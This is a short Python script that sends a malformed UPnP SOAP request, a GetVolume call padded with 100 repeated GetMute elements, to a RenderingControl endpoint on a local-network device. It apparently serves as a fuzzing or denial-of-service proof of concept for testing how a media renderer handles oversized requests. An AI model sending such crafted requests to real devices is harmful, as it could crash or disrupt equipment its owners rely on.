#!/usr/bin/env python

import socket

MS2 = """<?xml version="1.0" encoding="utf-8" standalone="no"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body>
    <u:GetVolume xmlns:u="urn:schemas-upnp-org:service:RenderingControl:1">
      <InstanceID>0</InstanceID>
      <Channel>Master</Channel>
    </u:GetVolume>
  
  """ + """<u:GetMute>
      <InstanceID>0</InstanceID>
      <Channel>Master</Channel>
    </u:GetMute>"""*100 + """
  </s:Body>
</s:Envelope>"""

#1000000

MS1 = """POST /upnp/service/RenderingControl/Control HTTP/1.1\r\nHOST: 192.168.1.44:50000
Content-Length: """ + str(len(MS2)) + """
Content-type: text/xml; charset="utf-8"
SOAPACTION: "urn:schemas-upnp-org:service:RenderingControl:1#GetVolume"
USER-AGENT: Linux/4.14.150_s5, UPnP/1.0, Portable SDK for UPnP devices/1.12.0
CONNECTION: close

"""
# print(MS1 + MS2)
address = ("192.168.0.3", 49152)
skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
skt.connect(address)

skt.send(MS1.encode() + MS2.encode())
d = skt.recv(999)
print(d.decode())

